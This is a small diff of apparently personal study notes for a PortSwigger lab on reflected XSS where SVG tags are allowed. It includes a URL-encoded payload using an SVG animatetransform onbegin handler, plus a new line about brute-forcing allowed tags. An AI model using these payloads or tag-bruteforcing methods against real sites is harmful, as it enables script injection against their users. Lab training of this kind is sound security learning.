@@ -16,6 +16,7 @@ IV reflected xss with SVG allowed
 https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
 
 find how each tags work and what properties can be used to automatic execution of our script 
+bruteforce <> --> between them
 
 NOTE::::: When the XSS context is text between HTML tags, you need to introduce 
 some new HTML tags designed to trigger execution of JavaScript.
